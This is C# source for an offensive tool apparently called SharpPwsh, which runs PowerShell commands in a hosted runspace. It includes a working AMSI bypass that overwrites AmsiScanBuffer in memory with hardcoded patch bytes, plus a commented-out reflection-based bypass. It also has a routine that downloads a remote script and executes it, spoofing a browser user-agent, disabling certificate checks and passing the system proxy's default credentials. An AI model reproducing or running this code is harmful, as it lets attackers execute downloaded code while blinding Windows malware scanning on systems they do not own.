using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Runtime.InteropServices;
using CommandLine;

// need to add as reference:
// c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

namespace SharpPwsh
{
    class Program
    {
        class Options
        {
            [Option('c', "cmd", Required = true, HelpText = "Powershell command to run")]
            public string inputCmd { get; set; }
            [Option('u', "uri", Required = false, HelpText = "URI to fetch remote script")]
            public string inputUri { get; set; }
            [Option('b', "bypass-amsi", Required = false, HelpText = "Bypass AmSI")]
            public bool bypassAmsi { get; set; }
        }
        static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
            {
                string inputCmd = o.inputCmd;
                string inputURI = o.inputUri;
                bool bypassAmsi = o.bypassAmsi;
                List<string> cmds = new List<string>();

                //
                if (bypassAmsi)
                {
                    Console.WriteLine("bypassing amsi");
                    //string bypass = AmsiBypass();
                    //cmds.Add(bypass);
                    //cmds.Add("$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \" * iUtils\") {$c=$b}}");
                    //cmds.Add("$d=$c.GetFields('NonPublic,Static')");
                    //cmds.Add("Foreach($e in $d) {if ($e.Name -like \" * InitFailed\") {$f=$e}};$f.SetValue($null,$true)");
                    PatchAmsiScanBuffer();
                }
                else
                {
                    Console.WriteLine("no bypass");
                }

                // 
                if (args.Contains(inputURI))
                {
                    Console.WriteLine("fetch " + inputURI);
                    string aCmd = FetchURI(inputURI);
                    cmds.Add(aCmd);
                }

                cmds.Add(inputCmd);
                ExecutePwsh(cmds);
            });
        }
        public static void ExecutePwsh(List<string> cmds)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            // instantiate a PowerShell object
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            foreach (string cmd in cmds)
            {
                if (String.IsNullOrWhiteSpace(cmd))
                {
                    Console.WriteLine("error: command string not supplied");
                    break;
                }
                ps.AddScript(cmd);
                ps.AddCommand("Out-String");
                PSDataCollection<object> results = new PSDataCollection<object>();
                ps.Streams.Error.DataAdded += (sender, e) =>
                {
                    Console.WriteLine("Error");
                    foreach (ErrorRecord er in ps.Streams.Error.ReadAll())
                    {
                        results.Add(er);
                    }
                };
                ps.Streams.Verbose.DataAdded += (sender, e) =>
                {
                    foreach (VerboseRecord vr in ps.Streams.Verbose.ReadAll())
                    {
                        results.Add(vr);
                    }
                };
                ps.Streams.Debug.DataAdded += (sender, e) =>
                {
                    foreach (DebugRecord dr in ps.Streams.Debug.ReadAll())
                    {
                        results.Add(dr);
                    }
                };
                ps.Streams.Warning.DataAdded += (sender, e) =>
                {
                    foreach (WarningRecord wr in ps.Streams.Warning)
                    {
                        results.Add(wr);
                    }
                };
                ps.Invoke(null, results);
                string output = string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                ps.Commands.Clear();
                Console.WriteLine(output);
            }

            rs.Close();
        }
        public static bool PatchAmsiScanBuffer()
        {
            byte[] patch;
            if (Is64Bit)
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            else
            {
                patch = new byte[8];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc2;
                patch[6] = 0x18;
                patch[7] = 0x00;
            }

            try
            {
                var library = LoadLibrary("amsi.dll");
                var address = GetProcAddress(library, "AmsiScanBuffer");
                uint oldProtect;
                VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Exception: " + e.Message);
                return false;
            }
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public static bool Is64Bit
        {
            get { return IntPtr.Size == 8; }
        }
        public static string FetchURI(string url)
        {
            try
            {
                // fuck ciphers
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                WebClient client = new WebClient();
                // hood up
                client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
                // yeah yeah
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                client.Proxy = WebRequest.GetSystemWebProxy();
                client.Proxy.Credentials = CredentialCache.DefaultCredentials;
                string responseString = client.DownloadString(url);
                //return Convert.FromBase64String(compressedEncodedShellcode);
                return responseString;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace);
                //var ret = new byte[] { 0xC3 };
                return null;
            }
        }
    }
}
